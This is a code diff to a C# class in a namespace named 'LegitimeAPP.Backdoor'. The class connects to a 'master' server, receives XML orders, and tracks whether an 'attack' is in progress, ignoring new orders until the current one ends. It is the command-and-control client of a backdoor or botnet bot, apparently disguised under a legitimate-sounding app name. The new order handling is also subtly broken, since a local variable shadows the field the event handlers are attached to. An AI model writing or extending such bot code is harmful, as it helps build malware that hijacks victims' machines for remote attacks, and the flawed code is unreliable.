@@ -4,11 +4,13 @@ using System.Net ;
 using System.Net.Sockets ;
 using System.Threading;
 using System.Text;
+using System.Linq ; 
 using System.IO;
 using System.Collections;
 using System.Collections.Generic ;
 using System.Xml;
 using System.Xml.Serialization;
+using LegitimeAPP.Shared ; 
 
 namespace LegitimeAPP.Backdoor {
     public class Connection {
@@ -16,6 +18,7 @@ namespace LegitimeAPP.Backdoor {
         private IPAddress _masterIP ;
         private int _masterPort ;
 
+        private Boolean _attackInProgress ; 
         private Stream stm ;
         private TcpClient tcp ;
 
@@ -23,12 +26,29 @@ namespace LegitimeAPP.Backdoor {
         private Thread _FollowingOrders ;
         private Thread _ConnectionRequests ;
 
-        private ASCIIEncoding enc = new ASCIIEncoding() ; 
- 
+        private Order order ;         
+
+        // Encoding 
+
+        private ASCIIEncoding enc = new ASCIIEncoding() ;
 
 
         public Connection(string masterIP, int masterPort) {
 
+            order = new Order() ;
+
+
+            _attackInProgress = false; 
+
+            order.NewAttackOrder += delegate {
+                Console.WriteLine("L'attaque est on") ;
+                _attackInProgress = true ; 
+            } ;
+
+            order.EndAttackOrder += delegate {
+                Console.WriteLine("L'attaque est off") ;
+                _attackInProgress = false ;  
+            } ; 
 
             enc = new ASCIIEncoding() ;
 
@@ -46,15 +66,16 @@ namespace LegitimeAPP.Backdoor {
         }
 
 
+
         /*
 
         Ecriture et lecture des messages envoyés et reçu par le serveur 
 
         */
         private string GetIncomingMessage() {
-            byte[] responseRaw = new byte[100] ;
+            byte[] responseRaw = new byte[1024] ;
             string response = "" ; 
-            int sizeResponse = stm.Read(responseRaw,0,100) ;
+            int sizeResponse = stm.Read(responseRaw,0,1024) ;
             for (int i = 0 ; i < sizeResponse ; i++) {
                 response += Convert.ToChar(responseRaw[i]);
             }
@@ -114,14 +135,43 @@ namespace LegitimeAPP.Backdoor {
         private void ListeningOrder() {
             while(true) {
 
-                if ( IsConnected ) {
+                try {
+                    if ( IsConnected ) {
+                    // Récupère le nouveau message 
                     string message = GetIncomingMessage() ;
-                    Order ord = Data<Order>.XmlToData(message) ;
+                    
+                    /*
+                    Dans le cas ou une attaque est en cours ignorer le nouvelle ordre
+                    */
+
+                    if ( !_attackInProgress ) {
+
+
+                        Order order = Data<Order>.XmlToData(message) ; 
+
+       
+                            order.Change(order) ;
+                            order.Start() ;  
+                      
+
+                        // Change l'ancien ordre par le nouveau 
+                        //order.Change(Data<Order>.XmlToData(message)) ;
+                        
+                        // Execute l'ordre 
+                        //order.Start() ;
+                    } else {
+                        Console.WriteLine("On ignore le nouvelle ordre car un est encore en cours ") ; 
+                    }
                      
                 } else {
                     Console.WriteLine("Le serveur ne répond plus. Déconnection...") ; 
                      break ;
                 }
+                } catch( Exception ex) {
+                    Console.WriteLine(ex.Message) ; 
+                }
+
+                
             }
         }
 
